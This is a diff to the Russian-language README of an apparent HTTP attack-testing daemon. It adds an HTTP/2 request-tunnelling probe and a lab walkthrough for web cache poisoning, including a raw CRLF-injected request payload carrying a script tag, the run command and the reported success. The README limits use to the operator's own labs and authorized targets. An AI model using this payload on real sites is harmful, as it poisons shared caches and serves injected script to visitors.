@@ -510,8 +510,11 @@ go run ./cmd/omnislashd -config examples/daemon/daemon.json -job lab-clte-gpost
 }
 ```
 
-- `probe`: `smuggle-chain`, `smuggle`, `race`, `h2race`.
+- `probe`: `smuggle-chain`, `smuggle`, `race`, `h2race`, `h2-tunnel`.
 - `tls`: `h1` (по умолчанию), `h2`, `none`.
+- `success_finding` требует конкретный finding (например, `cache_poisoned`), а
+  не просто завершение пробы. `success_contains` можно использовать вместе с
+  ним как дополнительную проверку тела.
 - `attempts` — сколько прогонов внутри одного запуска; `until_success` снимает
   задачу с расписания после первого успеха, а `exit_on_success` в корне
   конфига завершает процесс (CI/lab-режим).
@@ -552,6 +555,43 @@ go run ./cmd/omnislashd -config examples/daemon/daemon.json -once
 Инстанс лабы одноразовый: если URL истёк, замените хост в
 `examples/daemon/daemon.json` и `config.lab.json`. Применяйте только к своим
 лабам и авторизованным целям.
+
+### Лаба: web cache poisoning via HTTP/2 request tunnelling
+
+Вторая готовая пара — `examples/daemon/daemon-cache-tunnel.json` и
+`config.cache-tunnel.json`. Front-end принимает HTTP/2, но даунгрейдит запрос
+в HTTP/1.1 и не санитайзит `:path`. Проба шлёт `HEAD` с CRLF в `:path`:
+
+```text
+/? HTTP/1.1
+Host: <lab>
+
+GET /resources?<script>alert(1)</script> HTTP/1.1
+Host: <lab>
+
+GET /resources/images/blog.svg HTTP/1.1
+Host: <lab>
+
+GET /image/blog/posts/7.jpg HTTP/1.1
+Host: <lab>
+X-Omnislash-Tunnel: <nonce>
+```
+
+Back-end разбирает три вложенных запроса. `/resources?...` отражает payload
+без кодирования в `Location`, а статические файлы дают достаточно байт, чтобы
+перекрыть `Content-Length` главной страницы. Front-end читает это же число
+байт из back-end и кэширует смешанный ответ под `/`. Затем проба делает
+обычный `GET /` и требует маркер в теле; finding `cache_poisoned` выдаётся
+только после этой проверки.
+
+```bash
+go run ./cmd/omnislashd -config examples/daemon/daemon-cache-tunnel.json -once
+```
+
+Результат прогона: `statuses: [200, 200]`, findings `h2_tunnel_confirmed` и
+`cache_poisoned`, в теле закэшированного ответа — `Content-Type: text/html` и
+`<script>alert(1)</script>`. Лаба была доведена до `Solved`; так как инстанс
+одноразовый, для новой лабы замените хост в обоих JSON-файлах.
 
 ## Ротация, здоровье и кулдауны
 
